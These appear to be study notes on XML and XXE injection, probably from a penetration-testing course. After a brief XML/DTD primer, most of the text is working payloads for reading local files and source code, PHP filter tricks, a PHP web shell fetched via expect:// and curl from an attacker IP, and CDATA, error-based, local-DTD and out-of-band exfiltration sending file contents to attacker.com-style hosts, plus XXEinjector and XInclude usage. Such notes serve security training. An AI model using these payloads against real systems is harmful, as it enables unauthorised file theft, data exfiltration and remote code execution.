
# XML

    Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements.


# Bad Characters

some characters are used as part of an XML document structure, like `<, >, &, or "`. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g.` &lt;, &gt;, &amp;, &quot;`). Finally, we can write comments in XML documents between `<!--` and `-->`, similar to HTML documents.



# XML DTD

XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. 


```
<!DOCTYPE email [
<!ELEMENT email (date, time, sender, recipients, body)>
<!ELEMENT recipients (to, cc?)>
<!ELEMENT cc (to*)>
<!ELEMENT date (#PCDATA)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT to  (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```
As we can see, the DTD is declaring the root email element with the `ELEMENT` type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by `PCDATA`).


# DTD in External File

```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email SYSTEM "email.dtd">
```

    
# DTD somewhere in the internet    
It is also possible to reference a DTD through a URL, as follows:

```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```


# XML Entities

We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY company "Inlane Freight">
]>
```


# Entity Reference

Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "http://localhost/company.txt">
    <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


Note: We may also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en"). In this module, we'll be using SYSTEM, but we should be able to use either in most cases.



# Local File Disclosure

    
- note which elements are being displayed , if any.


    Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to `application/xml`, and then convert the JSON data to XML.


- Reading Sensitive Files

```
<!DOCTYPE email [
<!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

    Tip: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.


- Reading Source Code


```
<!DOCTYPE email [
<!ENTITY company SYSTEM "file://index.php">
]>
```


# PHP Filters

PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. 

```
<!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

This trick only works with PHP web applications. 


# Remote Code Execution with XXE

we may be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP expect module to be installed and enabled.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands.

```
    $ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

    $ sudo python3 -m http.server 80
```

```
<?xml version="1.0"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
    <name></name>
    <tel></tel>
    <email>&company;</email>
    <message></message>
</root>
```

    Note: We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.

    Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.



# Exfiltration with CDATA

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. `<![CDATA[ FILE_CONTENT ]]>)`. This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

One easy way to tackle this issue would be to define a begin internal entity with `<![CDATA[`, an end internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:

```
<!DOCTYPE email [
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY end "]]>">
<!ENTITY joined "&begin;&file;&end;">
]>
```
After that, if we reference the &joined; entity, it should contain our escaped data. However, `this will not work, since XML prevents joining internal and external entities`, so we will have to find a better way to do so.

To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. If we reference them from an external source ( then all of them would be considered as external and can be joined, as follows:


- Define the dtd Document in our server

External Document:

`<!ENTITY joined "%begin;%file;%end;">`

- Start a listening server

```
    $ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

    $ python3 -m http.server 8000
```
- First parameter is : `"<![CDATA["`

- Our file gets sandwitched

- Then the closing brackets `"]]>"`

- reference our external entity (xxe.dtd) 

- print the `&joined;` entity we defined above,php file, as follows:

```

<!DOCTYPE email [
<!ENTITY % begin "<![CDATA["> 
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
<!ENTITY % end "]]>"> 
<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
%xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->

```
    Note: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop)


# Error Based XXE




```
    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
    
The above payload defines the file parameter entity and then joins it with an entity that does not exist.

`%nonExistingEntity;` does not exist, so the web application would throw an error saying that 
this entity does not exist, along with our joined %file; as part of the error. 


Now, we can call our external DTD script, and then reference the error entity, as follows:

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>

```

# Error-based with local DTD redefining

If you are not able to reach out to a remote server  and load your DTD , you may be able to redefine the purpose of a parameter value whis is called in a DTD located somewhere in the local machine of the vuln application

The exploitation path is :

### Locate a usefull DTD
- Define a parameter variable with the local path of the DTD file 

- Send the request to Intruder and fuzz for an existing one

- Find a parameter entity defined and **referenced** inside this DTD

### Redefine its purpose

-  Define a parameter variable with the local path of the DTD file 

- Redefine the parameter thats being exploited. The payload will be two entities dynamically generated when this already used parameter referenced
    - a file parameter entity which is the data we want to exfil
    - an eval parameter which then will be referenced and will also dynamically generate an error parameter entity which call a nonexistent SYSTEM file and trigger an error
    - reference the eval parameter 
    - reference the error parameter

- call the DTD parameter to Parse the `external` local DTD 


```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % existent_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

 - &#x25  maps to `%`
 - \&#x26; maps to `&`
 - &#x27 maps to `"`
 
# Out of Bound Exfiltration

    
For Something cases, we can utilize a method known as Out-of-band (OOB) Data Exfiltration
Instead of having the web application output our file entity to a specific XML entity, we will 
make the web application send a web request to our web server with the content of the file we 
are reading.

- In our hosted dtd goes:
    - The file external variable parameter entity with php://filter/convert.base64-encode to encode the file
    - an external variable entity which calls us back with the file contents as http an parameter


```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```


# Automated OOB Exfiltration

    
 we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector]( https://github.com/enjoiz/XXEinjector ). This tool supports basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.


Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:
```
    <?xml version="1.0" encoding="UTF-8" ?>
    XXEINJECT
```

`$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`


`$ cat Logs/10.129.201.94/etc/passwd.log `

    

# Blind XXE to Exfiltrate Data


You can host a dtd file on your attack server and force the vulnerable application to load the DTD.

- inject the ssrf code in page`s xml 
- call the parameter entity inside the dtd to trigger the request

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://attacker.com/mal.dtd"> %xxe;]>
```

- the hosted dtd will look like :

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

- the file parameter entity specifies a file to exfiltrate

- eval parameter entity specifies a string that when invoked will dynamically create a new parameter entity called exfiltrate.This is only allowed in external dtd`s .

    - ! Using is a parameter entity inside the definition of another parameter entity is forbiden in most cases in internal dtd`s

    - A work around would be to redefine a parameter entity inside the internal dtd, that is declared in the external one.

- exfiltrate then is called and a new request is made with the file data appended to the url as url Parameters.



# XInclude

Xinclude is a way for xml documents to be merged

You can use this type of injection when the server embeds user data to an XML Server Side Request while we dont POST XML data directly

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```


- Example

- Lets say Server embeds user data in curly brackets
```
<?xml version='1.0'?>
<document>
  <p>Paragraph1</p>
  {}
</document>
```

- Sending the payload becomes

```
<?xml version='1.0'?>
<document>
  <p>Paragraph1</p>
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>
</document>
```

- After Merging the documents 

```

<?xml version='1.0'?>
<document>
  <p>Paragraph1</p>
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  . . .
</document>

```